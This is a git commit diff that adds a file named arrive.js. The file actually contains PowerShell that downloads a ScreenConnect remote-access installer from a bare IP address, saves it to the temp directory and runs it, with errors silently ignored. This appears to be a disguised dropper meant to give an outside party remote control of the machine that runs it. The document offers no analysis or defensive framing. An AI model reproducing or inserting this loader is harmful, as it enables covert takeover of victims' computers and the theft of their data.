369a603ef877717e5fd6eed8cd45f2053ebe96a1
cruiseplug420 <cruiseplug420@gmail.com>
2026-03-05 08:51:53 -0600

    Add files via upload

---
+++ arrive.js
@@ -0,0 +1,20 @@
+$someData = @(
+    [PSCustomObject]@{a = "http://184.107.178.101:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"; b = "ScreenConnect.ClientSetup.msi"}
+  );
+
+  foreach ($i in $someData) {
+    try {
+      $filePath = "$env:TEMP\$($i.b)";
+      $download = $true;
+      if (Test-Path $filePath) {
+        $download = $false;
+      }
+      if ($download) {
+        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
+      }
+      Start-Process $filePath;
+    }
+    catch {
+      # Error handling (optional)
+    }
+  }
